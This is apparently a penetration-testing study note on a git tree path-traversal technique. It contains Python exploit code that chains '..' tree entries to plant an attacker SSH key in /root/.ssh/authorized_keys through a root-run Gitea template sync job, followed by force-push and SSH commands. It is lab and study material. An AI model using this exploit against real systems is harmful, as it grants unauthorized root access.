---
type: technique
tags: [ejpt:host-net-pentest]
tools: []
cves: []
related: ["[[cron-job-abuse]]", "[[ci-cd-pipeline-abuse]]", "[[ssh]]"]
---

# Git Tree Path Traversal

Abusing a background job that materializes git tree entries **without normalizing `..` path components**, so an attacker-controlled repository layout escapes the job's workspace and writes to an arbitrary (usually root-owned) path.

## When it works

- A **privileged automation** (sync job, backup, deploy) clones repositories the attacker can push to — Gitea *template* repos are the canonical case: any authenticated user can create one and enable **Make repository a template**, which opts it into the job.
- The job builds checkout paths by **joining tree-entry names onto its workspace root** (`workspace + "/" + entry.name`) with no resolution of `..` components.
- Git itself never validates path components: a tree object may contain an entry literally named `..`. Clients push such trees without complaint and normal `git checkout` of such a commit is refused — the bug lives in the *consumer's* materialization logic, not in the protocol.
- The attacker can count the workspace's depth below `/` (read the job's script/config), which fixes how many `..` hops are needed to land at the filesystem root.

## Exploit

1. Generate the callback keypair: `ssh-keygen -t ed25519 -f /tmp/.k -N ''`.
2. Create a repository on the git host and mark it as a **template** so the sync job picks it up.
3. Craft the commit's tree with raw object writes — a plain checkout refuses `..` entries, so write blob/tree/commit objects directly (SHA-1 header + zlib):

   ```python
   def entry(mode, name, sha):
       return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

   blob = write_obj(pubkey, "blob")                          # your .pub line
   t    = write_obj(entry("100644", "authorized_keys", blob), "tree")
   t    = write_obj(entry("40000", ".ssh", t), "tree")
   t    = write_obj(entry("40000", "root", t), "tree")       # target directory
   for _ in range(depth):                                     # depth = workspace below /
       t = write_obj(entry("40000", "..", t), "tree")         # climb out of the workspace
   root = write_obj(readme + entry("40000", "..", t), "tree") # commit's root tree
   ```

4. Force-push the crafted commit (`git push -u origin main --force`) and wait for the job's next run.
5. `ssh -i /tmp/.k user@TARGET` — the traversal wrote `<workspace>/…/../../root/.ssh/authorized_keys`.

## Why it matters

- Same shape as [[cron-job-abuse]] (privileged job, attacker-influenced input) and [[ci-cd-pipeline-abuse]] (automation consuming attacker content), but the primitive is **path traversal inside the checkout**, not a writable script — no file on disk ever needs to be writable by you.
- The payload is *data* (an object graph), not executable code: it survives any review of the job's own scripts.
- The only fragile input is the `..` depth: too few hops and the file materializes inside the workspace instead of the target path.

## Seen in

[[nexus]] — `gitea-template-sync.timer` (root, every minute) syncs template repos; a crafted tree with four `..` entries wrote `/root/.ssh/authorized_keys` → `ssh -i` root.
